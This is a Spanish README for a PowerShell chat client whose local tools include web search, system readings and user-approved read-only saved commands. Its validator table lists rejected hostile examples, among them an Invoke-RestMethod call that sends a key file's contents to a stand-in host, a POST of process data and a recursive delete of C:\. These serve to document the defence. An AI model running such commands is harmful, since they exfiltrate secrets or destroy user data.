# PRC AI 2.0

Cliente de chat para **OpenAI**, **xAI (Grok)** y modelos locales (**Ollama**
y **llama-server** de llama.cpp) escrito en PowerShell puro para la consola de
Windows. Sin dependencias externas: nada de curl, nada de Python, nada de Node.
Un `AI` en cualquier CMD y a conversar.

Es un proyecto personal pequeño: empezó como un puñado de scripts batch + gawk
y esta versión 2.0 lo reescribe entero sobre PowerShell 5.1 con un núcleo HTTP
propio (streaming SSE incluido). Se publica por si a alguien más le sirve.

```
C:\> AI "explica en una linea que es SSE"
Server-Sent Events: el servidor manda texto por HTTP en fragmentos a medida
que lo genera, y el cliente lo pinta segun llega.
```

## Características

- **REPL interactivo con memoria**: la conversación se acumula y se envía
  completa en cada turno. `/new` la vacía, `/save` la guarda en JSON.
- **Modo una-respuesta** para tuberías: `AI "pregunta"` responde y sale.
- **Entrada estándar como contexto**: `type notas.txt | AI "resume esto"`.
- **Streaming token a token** con render incremental de Markdown y colores
  ANSI (se desactivan solos al redirigir la salida).
- **Filtro de `<think>`** para modelos de razonamiento locales: el bloque de
  razonamiento no se muestra, aunque llegue partido entre fragmentos SSE.
- **Busca en internet cuando hace falta**, sin abrir el navegador: el modelo
  decide si la pregunta necesita datos actuales (dólar, clima, noticias...) y,
  solo si la laptop tiene salida a internet, busca en DuckDuckGo, lee las
  primeras páginas y contesta con eso, citando las fuentes. Ver «Buscar en
  internet».
- **Sabe lo que la laptop ya sabe**, sin internet: la hora y la fecha salen
  del reloj del equipo, y la batería, la red (wifi, IP local, puerta de
  enlace, DNS, si hay internet), Windows, el procesador, la memoria, los
  discos y la gráfica se leen del propio equipo cuando se pregunta por ellos.
  Ver «Datos de este equipo».
- **Comandos de solo lectura que guardas tú**, pidiéndolo en la conversación:
  «agrégame un comando para ver mi IP pública». El chat pregunta, propone el
  comando, pide confirmación, lo prueba y enseña el resultado; desde entonces
  «¿cuál es mi IP pública?» se contesta sola. Unas reglas fijas, no el
  modelo, deciden si el comando es de solo lectura. Ver «Comandos guardados».
- **Diagnóstico** con `AI -Check`: estado de clave y conectividad de los
  proveedores sin gastar tokens.
- **Local por defecto**: sin configurar nada habla con Gemma 4 E4B en el
  llama-server de la propia laptop, sin clave y sin mandar la conversación a
  la nube.

Qué cambió en cada versión y por qué: [HISTORIAL.md](HISTORIAL.md).

## Requisitos

- Windows 10/11.
- Windows PowerShell **5.1 o superior** (el que trae Windows; también funciona
  en PowerShell 7).
- Opcional: [PSReadLine](https://github.com/PowerShell/PSReadLine) para
  historial persistente en el modo interactivo (viene de serie en Windows 10/11).
- Para los proveedores locales: [Ollama](https://ollama.com) escuchando en
  `http://localhost:11434`, y/o `llama-server` de
  [llama.cpp](https://github.com/ggml-org/llama.cpp) en modo router en
  `http://127.0.0.1:8080` (ver «Modelos locales con llama-server»).

## Instalación

1. Clona o descarga esta carpeta donde quieras, por ejemplo `D:\PRC CMD AI`.
2. Añade esa carpeta al `PATH` (o crea un alias). Con eso, `AI` funciona desde
   cualquier CMD.
3. Guarda tu clave de API (ver siguiente sección).

> **Nota sobre ExecutionPolicy**: `AI.bat` lanza PowerShell con
> `-ExecutionPolicy Bypass`. Eso afecta **solo a ese proceso**: no cambia
> ninguna directiva del sistema ni pide permisos de administrador.

## Configuración de claves

Las claves **no se guardan en ficheros** ni pasan por la línea de comandos.
`tools/Set-AIKey.ps1` las pide con `Read-Host -AsSecureString` (no se ven al
teclear, no quedan en el historial) y las escribe como variable de entorno de
usuario en `HKCU\Environment`, en los ámbitos *User* y *Process*:

```
AI -SetKey OPENAI_API_KEY     # para OpenAI
AI -SetKey XAI_API_KEY        # para xAI / Grok
```

Para borrar una clave, desde la carpeta del proyecto:
`powershell -ExecutionPolicy Bypass -File tools\Set-AIKey.ps1 -Name XAI_API_KEY -Remove`.

Ollama y llama-server no necesitan clave. Si lanzas llama-server con
`--api-key`, guárdala con `AI -SetKey LOCAL_AI_API_KEY`.

> **Precedencia de ámbitos**: el código lee primero el ámbito *User* (HKCU) y
> solo si no existe cae al ámbito *Process*. Es deliberado (la clave guardada
> con `-SetKey` se ve al instante, sin abrir consola nueva), pero significa
> que un `$env:XAI_API_KEY = '...'` de sesión **no** tiene efecto si ya hay
> una clave guardada en el registro. Bórrala con `-Remove` si quieres probar
> con otra clave temporal.

## Uso

```
AI                              modo interactivo (REPL con memoria)
AI "que es un BOM UTF-8"        una respuesta y sale
type informe.txt | AI "resume"  la entrada estandar entra como contexto
type informe.txt | AI           sin pregunta: todo stdin es la pregunta
AI "pregunta" -Provider gpt     elige proveedor (alias: gpt, grok, deepseek...)
AI "pregunta" -Provider gemma   modelo local (Gemma 4 E4B)
AI "pregunta" -Provider gemma3  modelo local mas rapido (Gemma 3 4B)
AI "pregunta" -Provider qwen    modelo local mas capaz y mas lento (Qwen3 8B)
AI "pregunta" -Provider gpt -m gpt-4o -Temp 0.2 -NoStream -Plain
AI "pregunta" -NoWeb            sin buscar en internet
AI "pregunta" -NoEquipo         sin leer datos de este equipo
AI "pregunta" -NoComandos       sin usar los comandos guardados
AI -Check                       diagnostico de los proveedores, internet, el equipo
                                y los comandos guardados
AI -Help                        ayuda completa
```

Dentro del modo interactivo:

| Comando        | Efecto                          |
| -------------- | ------------------------------- |
| `bye` / `exit` | salir                           |
| `cls`          | limpiar pantalla                |
| `/new`         | vaciar la memoria               |
| `/model X`     | cambiar de modelo               |
| `/provider X`  | cambiar de proveedor            |
| `/save [ruta]` | guardar la conversación en JSON |
| `/buscar X`    | buscar X en internet y contestar con lo encontrado |
| `/web on|off` | dejar o no que el modelo busque solo |
| `/equipo [X]`  | enseñar los datos de este equipo sin preguntar al modelo (X: `bateria`, `red`, `equipo`, `sistema`, `procesador`, `memoria`, `disco`, `grafica`) |
| `/equipo on|off` | dejar o no que se lean los datos de este equipo al preguntar |
| `agrégame un comando para ...` | guardar un comando conversando: el chat pregunta, propone, pide confirmación, lo prueba y enseña el resultado |
| `/comando agregar N C` | lo mismo de una vez: revisar el comando `C` y guardarlo con el nombre `N` |
| `/comando`     | lista de los comandos guardados |
| `/comando N`   | ejecutar el comando guardado `N` y enseñar su salida, sin modelo |
| `/comando quitar N` | borrarlo |
| `/comando on|off` | dejar o no que el modelo use los comandos guardados |
| `/help`        | mostrar la ayuda                |

Sin configurar nada, el proveedor es `gemma`: Gemma 4 E4B en el llama-server
local (`http://127.0.0.1:8080`), sin clave y sin que nada salga de la laptop.
Hace falta que ese servidor esté encendido, o elegir otro proveedor. Orden de
precedencia del proveedor: opción `-Provider`, variable de entorno
`AI_PROVIDER`, `settings.json` y, si no hay nada, `gemma`.

La configuración por defecto (proveedor, modelo, instrucción de sistema) se
puede fijar en `%LOCALAPPDATA%\PRC-CMD-AI\settings.json`:

```json
{ "provider": "xai", "model": "grok-4.3", "system": "Responde breve y al grano." }
```

También sirven las variables de entorno `AI_PROVIDER` (proveedor por defecto)
y `AI_QUESTION` (la usa internamente `AI.bat` para pasar la pregunta intacta).

El `model` de `settings.json` va con su `provider`: si eliges otro proveedor
con `-Provider` o `AI_PROVIDER`, se usa el modelo por defecto de ese proveedor.
Para que el de por defecto sea otro modelo local: `{ "provider": "qwen" }`.

En el mismo fichero, `"web": false` apaga la búsqueda en internet,
`"equipo": false` la lectura de los datos de este equipo y `"comandos": false`
el uso de los comandos guardados.

## Proveedores soportados

| `-Provider` | Servicio             | Variable de clave | Modelo por defecto | Alias                         |
| ----------- | -------------------- | ----------------- | ------------------ | ----------------------------- |
| `openai`    | OpenAI               | `OPENAI_API_KEY`  | `gpt-4o-mini`      | `gpt`, `chatgpt`, `oai`       |
| `xai`       | xAI                  | `XAI_API_KEY`     | `grok-4.3`         | `grok`, `x`                   |
| `ollama`    | Ollama (local)       | *(no necesita)*   | `qwen3:4b`         | `deepseek`, `local`, `ds`     |
| `gemma`     | llama-server (local) | *(no necesita)*   | `gemma-4-e4b`      | `gemma4`, `e4b`, `llama`, `llamacpp` |
| `gemma3`    | llama-server (local) | *(no necesita)*   | `gemma-3-4b`       | |
| `qwen`      | llama-server (local) | *(no necesita)*   | `qwen3-8b`         | `qwen3`                       |

Todos hablan el mismo dialecto (`POST /v1/chat/completions`), así que
añadir un proveedor compatible es añadir una entrada a la tabla de
`lib/providers.ps1`. Nada más.

### Modelos locales con llama-server

`gemma`, `gemma3` y `qwen` son tres entradas que apuntan al **mismo** `llama-server` en
modo router (`--models-preset fichero.ini`): un puerto, varios modelos.

Para levantar el tuyo hace falta un llama.cpp reciente, con modo router (el
autor usa la compilación b10209). Crea un fichero de modelos, por ejemplo
`modelos.ini` (ASCII o UTF-8 sin BOM; cada clave es un argumento de
`llama-server` sin los guiones; las rutas van sin comillas):

```ini
version = 1

[*]
ctx-size = 4096
parallel = 1
sleep-idle-seconds = 120

[gemma-4-e4b]
model = models\gemma-4-E4B-it-Q4_K_M.gguf
; entero en la grafica hacen falta mas de 4 GB; con 4 GB, unas 32 capas
n-gpu-layers = 99

[gemma-3-4b]
model = models\gemma-3-4b-it-Q4_K_M.gguf
n-gpu-layers = 99

[qwen3-8b]
model = models\Qwen3-8B-Q4_K_M.gguf
reasoning-budget = 0
```

y arranca el servidor desde la carpeta que contiene ese fichero y `models\`:

```
llama-server --models-preset modelos.ini --models-max 1 --host 127.0.0.1 --port 8080
```

Los `.gguf` pueden ser otros: lo que tiene que coincidir con
`lib/providers.ps1` es el nombre de cada sección.

- El modelo se elige con el campo `model` de la petición, que tiene que
  coincidir letra por letra con una sección del fichero de modelos
  (`[gemma-4-e4b]`, `[gemma-3-4b]`, `[qwen3-8b]`). Con otro nombre el servidor contesta
  `HTTP 400 -> model '...' not found`.
- `AI` no arranca el servidor. Si no está en marcha, el error lo dice
  (`nadie escucha en http://127.0.0.1:8080/v1`) y añade el texto de
  `$AI_LLAMA_HINT`. El que viene en el repositorio es la orden del autor
  (`pm2 start rpa-ai-portable`): cámbialo en `lib/providers.ps1` por la que
  arranca tu servidor.
- Con `--models-max 1` solo hay un modelo en memoria: la primera pregunta tras
  cambiar de modelo tarda bastante más (de 11 a 18 s en el equipo del autor) y,
  tras el reposo por inactividad, unos 5 s más.
- Plazo de espera hasta que el servidor empieza a contestar: 300 s con `gemma` y `gemma3`
  y 600 s con `qwen` (campo `Timeout` de `lib/providers.ps1`), porque antes de
  la primera palabra el servidor puede tener que cargar o cambiar el modelo y
  leer toda la entrada. En los demás proveedores son 30 s.
- Si otro cliente del mismo servidor pide el otro modelo a la vez, una de las
  dos preguntas puede cortarse o fallar con `HTTP 500 ... failed to load`. `AI`
  lo dice (`la respuesta se corto`) y no reintenta sola: hay que repetir la
  pregunta. En el modo una-respuesta sale con código 2; en el interactivo el
  turno fallido se retira de la memoria y la sesión sigue.
- Si en ese puerto hay un `llama-server` de un solo modelo (sin
  `--models-preset`), el campo `model` no elige nada: contesta siempre con el
  suyo, también a `-Provider qwen`. `AI -Check` lo delata
  (`contesta, pero no ofrece 'qwen3-8b'`).
- En el modo interactivo, `/provider qwen` cambia de modelo sin salir.
- A `gemma3` no se le ofrecen herramientas (campo `Tools = $false` de
  `lib/providers.ps1`): Gemma 3 4B no sabe pedirlas. Con `buscar_web` a la
  vista no buscaba y contestaba como si lo hubiera hecho («Según búsqueda
  web, el dólar está a 37 córdobas», inventado; 3 de 3 preguntas el
  2026-11-15). Sin herramientas dice que no puede buscar. Con `gemma3` sigue
  habiendo `/buscar X`, y los datos del equipo le llegan por el atajo (ver
  «Datos de este equipo»).
- `qwen` pide las respuestas sin razonamiento (`reasoning_budget_tokens = 0` en
  cada petición, campo `Extra`): Qwen3 razona por defecto y `AI` no muestra ese
  razonamiento, así que cada pregunta serían de 1 a 5 minutos en blanco
  (medido en el equipo del autor).
- El contexto lo fija el servidor. Con 4.096 tokens caben entradas de hasta
  unos 3.000; si aparece `HTTP 400` en una charla larga, usa `/new`.
- Otro puerto, otros nombres de modelo u otra orden de arranque:
  `$AI_LLAMA_URL`, el campo `Model` y `$AI_LLAMA_HINT` en `lib/providers.ps1`.
- `AI -Check` lee `/v1/models` y, en los proveedores locales, comprueba además
  que el servidor ofrece el modelo de cada entrada. En modo router añade el
  estado que da el servidor: `OK (loaded)`, `OK (loading)`, `OK (sleeping)` u
  `OK (unloaded)`. Dice `contesta, pero no ofrece 'qwen3-8b'` si en ese puerto
  hay un servidor de un solo modelo o con otros nombres, y `parado.` más el
  texto de `$AI_LLAMA_HINT` si nadie escucha. No carga ni despierta ningún
  modelo.

## Buscar en internet

Para las preguntas de todos los días no hace falta abrir el navegador, ir al
buscador y leer: se pregunta en la consola y `AI` busca si hace falta.

```
Ariel > a como esta el dolar hoy en Nicaragua?
ia > buscando: dolar hoy en Nicaragua
ia > El precio del dólar hoy en Nicaragua es de 36.81 córdobas a la venta...
   fuentes: https://www.bcn.gob.ni/...  https://www.cotizacion.co/...
```

- **Quién decide**: el modelo. A cada pregunta se le ofrece una herramienta,
  `buscar_web` (el campo `tools` de `/chat/completions`, el mismo en OpenAI,
  xAI, Ollama y llama-server). Lo que no cambia con el tiempo («cuánto es 748
  por 6», «qué es un BOM») lo contesta solo y al instante; precios, tipo de
  cambio, clima, noticias o resultados piden la búsqueda. Como mucho dos
  búsquedas por pregunta.
- **Solo si hay salida**: antes de cada pregunta se intenta una conexión a
  `html.duckduckgo.com:443` con un plazo de 2 s (se recuerda 60 s si hay
  conexión y 15 s si no). Sin conexión la herramienta no se ofrece, el modelo
  sabe que no puede buscar y contesta con lo que sabe avisando de que puede
  estar desactualizado. `AI -Check` dice si hay salida.
- **Qué lee**: los resultados de DuckDuckGo (gratis, sin clave) con su resumen
  y el texto de las dos primeras páginas que se dejen leer, recortado para
  que quepa en los 4096 tokens del servidor local. Nunca pide direcciones de
  la red de casa (127.0.0.1, 192.168.x.x...), aunque un resultado apunte ahí.
  Tras buscar, el modelo contesta con temperatura 0,2 para ceñirse a lo leído.
- **Memoria**: se guarda la pregunta y la respuesta, no las páginas leídas.
- **Apagarla**: `-NoWeb` en una pregunta, `/web off` en el modo interactivo o
  `"web": false` en `settings.json`. `/buscar X` busca siempre, sin esperar a
  que lo decida el modelo.
- **Límites**: las páginas que se cargan con JavaScript (muchas de resultados
  deportivos, la del tipo de cambio del BCN) llegan sin el dato; entonces el
  modelo se apoya en los resúmenes de los resultados o dice que no lo
  encontró. Si DuckDuckGo toma la consulta por un robot, lo dice. Depende de
  que el modelo sepa pedir herramientas: Gemma 4 E4B y Qwen3 8B lo hacen;
  Gemma 3 4B no, y por eso con `gemma3` solo se busca con `/buscar`.

## Datos de este equipo

Hay cosas que no están en internet ni en la memoria del modelo, sino en la
propia laptop: la hora, la batería, la red a la que está conectada. Preguntar
eso no necesita conexión.

```
Ariel > ¿cuál es mi IP?
ia > leyendo de este equipo: red
ia > Tu dirección IP en la red local es 192.168.1.23 (por wifi).
     La IP pública no se puede leer desde el equipo.
Ariel > ¿qué hora es?
ia > Son las 11:01 a. m. del domingo 15 de noviembre de 2026.
```

| Si preguntas por… | Sale de |
| --- | --- |
| La hora, la fecha, qué día es mañana | El reloj del equipo |
| La batería: carga, si está enchufada, tiempo que queda | Windows |
| Si hay internet, la red wifi y su señal, la IP local, la puerta de enlace, los DNS | Windows y la red local |
| El nombre del equipo, el usuario de Windows, la marca y el modelo | Windows |
| La versión de Windows y cuánto lleva encendido | Windows |
| El procesador, la memoria RAM, los discos y la tarjeta gráfica | Windows |

Funciona con tres piezas (`lib/equipo.ps1`):

- **El reloj** viaja en la instrucción de sistema de cada pregunta: la hora y
  la fecha se contestan a la primera, con cualquier proveedor.
- **El atajo**: si la pregunta pide a las claras un dato de este equipo («cuál
  es mi IP», «cuánta batería me queda», «cuánta RAM tiene esta laptop»), `AI`
  lo lee antes de preguntar al modelo y se lo pasa junto a la pregunta. Así
  no depende de que el modelo sepa pedir herramientas y se contesta en una
  sola vuelta (de 2 a 5 s con Gemma 4 E4B). Para saltar hacen falta dos
  cosas: el tema y una marca de que se habla de este equipo («mi», «tengo»,
  «me queda», «esta laptop»).
- **La herramienta `datos_equipo`**, para lo que el atajo no reconoce: se
  ofrece al modelo igual que `buscar_web` y él decide. A diferencia de
  `buscar_web` se ofrece haya o no internet, porque no sale a ningún sitio.

Lo que conviene saber:

- **Solo lectura y lista cerrada.** Son ocho lecturas fijas (`bateria`, `red`,
  `equipo`, `sistema`, `procesador`, `memoria`, `disco`, `grafica`). Del
  modelo llega el nombre de una lectura, nunca una orden: ni lo que escribes
  ni lo que escribe el modelo llega a una línea de comandos. Nada de esto
  hace peticiones a internet; si hay conexión lo dice el indicador de red de
  Windows.
- **No toma por suyo lo que no lo es.** «¿Cuánta batería tiene el iPhone
  15?», «¿qué procesador trae la Lenovo Legion 5?» o «¿cuánta RAM trae una
  laptop gamer?» no son de este equipo: no se lee nada y se buscan en
  internet como siempre. «¿Qué es una dirección IP?» la explica el modelo.
- **Si no pudo leer un dato, lo dice** y no pone ninguno en su lugar. La IP
  pública (la que ven los sitios de internet) no está en el equipo, y también
  lo dice; para tenerla hay que preguntársela a un servidor de fuera, y eso
  se hace guardando un comando (ver «Comandos guardados»).
- **Sin modelo**: `/equipo` enseña en pantalla todo lo leído, y `/equipo red`
  o `/equipo disco memoria` solo esa parte. Funciona sin servidor y sin
  internet.
- **Con un proveedor en la nube** (OpenAI, xAI), lo leído viaja a ese
  proveedor junto a la pregunta, como cualquier otro mensaje: el nombre del
  equipo, el usuario o la red wifi incluidos, si es lo que se preguntó.
  Solo se lee lo que pide la pregunta.
- **Apagarlo**: `-NoEquipo` en una pregunta, `/equipo off` en el modo
  interactivo o `"equipo": false` en `settings.json`. La hora y la fecha se
  siguen dando.
- **Límites**: el atajo es una lista de expresiones y no lo reconoce todo;
  una pregunta sin marca («¿cuánta batería queda?») la decide el modelo, que
  con Gemma 4 E4B lee el dato o pregunta a qué equipo te refieres. Con un
  modelo sin herramientas (`gemma3`) solo funciona el atajo: lo que no
  reconoce se contesta con un «no puedo saberlo». La hora en otra ciudad no
  sale del reloj: el modelo la busca en internet si hay conexión.

## Comandos guardados

Hay datos que `AI` no trae de serie pero que un comando de PowerShell da en
una línea: la IP pública, los procesos que más procesador han gastado, si el
antivirus está activo. Se guardan desde el propio chat, con un nombre, y
desde entonces el modelo puede pedirlos por ese nombre.

### Pidiéndolo en la conversación

Basta con pedirlo: «agrégame un comando para ver mi IP pública», «quiero
guardar un comando», «guarda este comando como ver-dns:
Get-DnsClientServerAddress». El chat pregunta y tú respondes:

```
Ariel > agrégame un comando para ver mi IP pública
ia > Vamos a guardar un comando de solo lectura. Yo pregunto y tú respondes; escribe «cancelar» para dejarlo.
ia > Busco un comando de solo lectura para: ver mi IP pública
ia > Este es el comando:

  comando:  Invoke-RestMethod -Uri https://api.ipify.org
  reglas:   pasa (Invoke-RestMethod)
  red:      sale a internet, a api.ipify.org (https, solo lee)
  modelo, con la documentacion de Microsoft a la vista:
    El comando realiza una solicitud web a la API de ipify.org. Lee la
    dirección IP pública del equipo desde esa API. No envía datos ni modifica
    nada en el equipo local.

ia > ¿Te vale así? Responde «sí», o dime qué le cambio.
Ariel > sí
ia > ¿Con qué nombre lo guardo? Pulsa Enter para «ip-publica». Cuando preguntes con esas palabras, lo ejecutaré.
Ariel >
ia > ¿Para qué sirve, en una frase? La leeré para saber cuándo usarlo. Pulsa Enter para «ver mi IP pública».
Ariel >
ia > Ya no tengo más preguntas. Esto es lo que voy a guardar:

  nombre:   ip-publica
  comando:  Invoke-RestMethod -Uri https://api.ipify.org
  sirve:    ver mi IP pública
  red:      sale a internet, a api.ipify.org

ia > ¿Lo pruebo ahora y, si funciona, lo dejo guardado? («sí» o «no»)
Ariel > sí
ia > Probando...
ia > Resultado de la prueba (0.3 s):

  203.0.113.7

ia > Funcionó y quedó guardado como «ip-publica». Pregúntame con las palabras «ip publica» y lo ejecuto, o tecléalo tú con /comando ip-publica.
```

- **Si no das el comando, lo propone el modelo**, y lo que propone pasa por
  las mismas reglas que lo que tecleas tú. Si no las pasa, se le dice por qué
  y lo corrige (tres intentos). Si pides algo que no es de solo lectura
  («para borrar los temporales»), dice que no se puede.
- **Puedes pedir cambios** («que sean cinco», «solo la fecha») o pegar tú otro
  comando en cualquier respuesta.
- **Las preguntas se cierran con un resumen y una sola confirmación.** Hasta
  ese «sí» no se ejecuta ni se guarda nada.
- **Se prueba antes de guardar.** Si la prueba falla o no devuelve ningún
  dato, no se guarda, y puedes cambiarlo o dejarlo.
- **«cancelar»** corta en cualquier momento.
- Las preguntas son fijas, no las redacta el modelo: el diálogo no depende de
  que el modelo se acuerde de pedir confirmación.
- Lo abren las frases que empiezan por «agrega», «añade», «guarda» o
  «registra» (o «quiero agregar…») y nombran un comando. «Crea un comando de
  git para…» no: eso pide que se escriba uno, y lo contesta el modelo.

### De una vez, con `/comando agregar`

Si ya tienes el comando y el nombre:

```
Ariel > /comando agregar ip-publica Invoke-RestMethod -Uri https://api.ipify.org

  comando:  Invoke-RestMethod -Uri https://api.ipify.org
  reglas:   pasa (Invoke-RestMethod)
  red:      sale a internet, a api.ipify.org (https, solo lee)
  modelo, con la documentacion de Microsoft a la vista:
    Este comando realiza una solicitud HTTP a la API de ipify.org. Lee la
    dirección IP pública del equipo desde esa API. No envía datos ni modifica
    nada en el equipo local.

  para que sirve? (una frase; el modelo la lee para saber cuando usarlo) > mi IP publica
  lo guardo? (s/n) > s
guardado como «ip-publica». Primera ejecucion:
203.0.113.7

Ariel > ¿cuál es mi IP pública?
ia > ejecutando el comando guardado: ip-publica
ia > Tu IP pública es 203.0.113.7.
```

### Quién decide si un comando vale

**Unas reglas fijas, no el modelo.** El modelo explica el comando (con el
principio de la documentación de Microsoft a la vista, si hay conexión) y
avisa si ve algo raro, pero no aprueba nada: un modelo se equivoca, y una
página que dice «este comando es seguro» es texto de fuera. Al final confirmas
tú, viendo el comando exacto y a qué servidor sale.

Las reglas (`Get-AIComandoPlan`, en `lib/comandos.ps1`):

1. **Nada se guarda sin tu «sí»**, y solo en el modo interactivo. El comando
   lo tecleas tú o lo propone el modelo cuando se lo pides; lo que propone
   no vale por venir del modelo, sino si pasa las reglas siguientes, las
   mismas en los dos casos. Una página de internet o la salida de otro
   comando no pueden agregar nada.
2. **Se analiza con el analizador del propio PowerShell**, no con expresiones
   regulares. Tiene que ser una sola canalización de comandos con argumentos
   fijos. Se rechazan las variables, las cadenas con sustitución, los
   paréntesis, los bloques `{ }`, las llamadas a métodos, los tipos `[..]`,
   las redirecciones, los comentarios y `;`, `&`, `.`.
3. **Cada comando tiene que estar en una lista cerrada**, por su nombre
   completo (los alias no valen: `irm` no, `Invoke-RestMethod` sí) y venir de
   un módulo de la carpeta de Windows. Un programa solo vale si está en
   `System32`, lo firma Microsoft y sus argumentos casan con una forma
   permitida: `ipconfig /all` sí, `ipconfig /release` no.
4. **Cada parámetro tiene que estar en la lista de ese comando.** Las
   abreviaturas (`-OutF`) y los argumentos sin nombre los resuelve el
   enlazador de PowerShell antes de comparar.
5. **Lo que sale a internet**: solo `https`, dirección escrita fija, servidor
   público (nunca `192.168.x.x`, `localhost` ni nombres de la red de casa),
   solo lectura (`GET`), sin seguir redirecciones y solo como primer comando.
   Al no recibir nada por la canalización, no puede sacar datos del equipo.

Lo que pasa y lo que no:

| Comando | Resultado |
| --- | --- |
| `Invoke-RestMethod -Uri https://api.ipify.org` | Pasa; avisa de que sale a internet, a api.ipify.org |
| `Get-Process \| Sort-Object CPU -Descending \| Select-Object -First 5 Name, CPU` | Pasa |
| `Get-MpComputerStatus \| Select-Object AntivirusEnabled` | Pasa |
| `ipconfig /all \| Select-String DNS` | Pasa |
| `ipconfig /release` | No: no es una forma de solo lectura de `ipconfig` |
| `Get-ChildItem C:\ \| Remove-Item` | No: no están en la lista |
| `Get-Process \| ForEach-Object Kill` | No: `ForEach-Object` llamaría a un método de cada objeto |
| `Invoke-RestMethod "https://x.com/?d=$(Get-Content clave.txt)"` | No: la dirección no es fija |
| `Get-Process \| Invoke-RestMethod -Uri https://x.com -Method Post` | No: lo que sale a internet solo puede ir el primero |
| `Invoke-WebRequest -Uri http://192.168.0.1/reboot` | No: ni `https` ni servidor público |
| `.\mi-script.ps1`, `C:\Herramientas\x.exe`, `powershell -Command ...` | No: ni scripts ni programas de fuera de Windows |

### Qué hay en la lista

- **Producen datos** (solo como primer comando): `Get-Date`, `Get-Culture`,
  `Get-TimeZone`, `Get-ComputerInfo`, `Get-Process`, `Get-Service`,
  `Get-HotFix`, `Get-PSDrive`, `Get-CimInstance`, `Get-NetAdapter`,
  `Get-NetIPAddress`, `Get-NetIPConfiguration`, `Get-NetRoute`,
  `Get-NetConnectionProfile`, `Get-NetFirewallProfile`,
  `Get-DnsClientServerAddress`, `Get-Volume`, `Get-Disk`, `Get-PhysicalDisk`,
  `Get-Partition`, `Get-PnpDevice`, `Get-Printer`, `Get-MpComputerStatus`,
  `Resolve-DnsName`, `Test-Connection`, `Test-NetConnection`,
  `Invoke-RestMethod`, `Invoke-WebRequest`.
- **Ordenan, eligen o dan formato** (solo detrás de otro): `Select-Object`,
  `Where-Object` (en su forma `Where-Object Status -eq Running`),
  `Sort-Object`, `Measure-Object`, `Group-Object`, `Format-List`,
  `Format-Table`, `Select-String`, `ConvertTo-Json`, `ConvertFrom-Json`,
  `ConvertTo-Csv`, `Out-String`.
- **Programas de System32**, con sus formas de solo lectura: `ipconfig`,
  `hostname`, `whoami`, `systeminfo`, `getmac`, `arp -a`, `route print`,
  `tasklist`, `driverquery`, `powercfg /list`, `netsh wlan show ...`,
  `netsh interface ... show ...`, `ping`, `nslookup`.
- **Fuera a propósito**: lo que lee ficheros, el registro, el portapapeles o
  los registros de sucesos (`Get-Content`, `Get-ChildItem`, `Get-ItemProperty`,
  `Get-Clipboard`, `Get-WinEvent`), porque lo leído viaja al modelo; y todo lo
  que escribe o cambia algo.

La lista y los parámetros de cada comando están en `$AI_CMD_CMDLETS` y
`$AI_CMD_EXES`, al principio de `lib/comandos.ps1`. Ampliarla es añadir una
entrada ahí.

### Cómo se ejecuta

- **El texto no se ejecuta nunca.** De la validación sale un plan (cada
  comando con su módulo, sus parámetros ya resueltos y sus valores) y lo que
  corre es ese plan, pieza a pieza. No hay diferencia posible entre lo que se
  revisó y lo que se ejecuta.
- **Cada ejecución vuelve a pasar las reglas.** Un `comandos.json` cambiado a
  mano por algo que no las pasa no se ejecuta: dice «ya no pasa las reglas».
- **Con plazo y tope**: 15 segundos y 4.000 caracteres de salida.
- **Con los permisos de la consola.** Nunca pide permisos de administrador.
- **El modelo pide por nombre.** La herramienta `comando_guardado` solo acepta
  un nombre de la lista; el modelo no puede escribir un comando. Si la
  pregunta lleva las palabras del nombre («ip pública» para `ip-publica`), se
  ejecuta sin esperar a que el modelo lo pida, y así sirve también con
  `gemma3`. `/comando ip-publica` lo ejecuta sin modelo.
- **La salida entra como dato**, rotulada con el servidor del que viene. Tras
  ejecutar un comando guardado no se ofrecen más herramientas en ese turno,
  para que una respuesta de fuera no pueda encadenar otra acción.

### Límites

- **Solo lectura no es lo mismo que privado.** La salida viaja al proveedor
  del modelo junto a la pregunta; con uno en la nube (OpenAI, xAI), sale del
  equipo.
- **De un servidor ajeno solo se sabe a cuál se llama**, no qué hace con la
  visita. Por eso lo ves y lo confirmas tú.
- **La lista es corta y rechazará comandos legítimos.** Es a propósito: se
  amplía a mano.
- **El modelo puede leer mal una salida.** A la columna `CPU` de
  `Get-Process`, que son segundos de procesador, Gemma 4 E4B le puso un signo
  de porcentaje; ahora se le pide que no añada unidades que la salida no
  diga, pero una salida clara ayuda (`Select-Object` con pocos campos).
- **Hasta 20 comandos**, guardados en
  `%LOCALAPPDATA%\PRC-CMD-AI\comandos.json`. Se apagan con `-NoComandos`,
  `/comando off` o `"comandos": false` en `settings.json`.

## Estructura del código

```
AI.bat              lanzadera CMD: separa pregunta de opciones y pasa la
                    pregunta por la variable AI_QUESTION (esquiva el bug de
                    comillas de "powershell -File")
bin/ai.ps1          CLI principal: REPL, modo una-respuesta, subcomandos
lib/core.ps1        nucleo HTTP (HttpWebRequest), streaming SSE, filtro de
                    <think>, parser de errores de las distintas APIs
lib/providers.ps1   tabla declarativa de proveedores y alias
lib/ui.ps1          colores ANSI, render incremental de Markdown, PSReadLine
lib/web.ps1         buscar en internet: hay salida?, DuckDuckGo, lectura de
                    paginas y la herramienta buscar_web
lib/equipo.ps1      lo que el equipo ya sabe: el reloj, las ocho lecturas
                    (bateria, red, Windows, hardware), el atajo y la
                    herramienta datos_equipo
lib/comandos.ps1    comandos de solo lectura que guarda el usuario: las
                    reglas (analizador de PowerShell y listas cerradas), la
                    ejecucion por piezas y la herramienta comando_guardado
tools/Set-AIKey.ps1 guardado seguro de claves en HKCU\Environment
tools/build.ps1     normaliza codificacion: UTF-8 con BOM en .ps1, CRLF en .bat
tests/probar.ps1    pasa todas las pruebas y dice cuales fallan
tests/*.ps1         una prueba por parte; sus frases y escenas, en tests/datos/
HISTORIAL.md        que cambio en cada version, por que y como se probo
```

Si editas cualquier `.ps1` o `.bat`, pasa después `tools/build.ps1`: Windows
PowerShell 5.1 decide la codificación de un script por su BOM, y un `.ps1`
sin BOM con acentos se lee como cp1252 y acaba en mojibake (o directamente no
parsea).

## Pruebas

Después de un cambio, y antes de subirlo:

```
powershell -NoProfile -ExecutionPolicy Bypass -File tests\probar.ps1
```

Sin modelo y sin internet tarda unos 20 segundos y pasa cuatro pruebas:

| Prueba | Qué mira |
| --- | --- |
| `comandos.ps1` | Comandos guardados: 158 comandos de `datos/reglas.txt` que las reglas deben aceptar o rechazar, el plan que se ejecuta, direcciones, nombres, la ejecución, guardar y cargar, lo que ve el modelo y el atajo. |
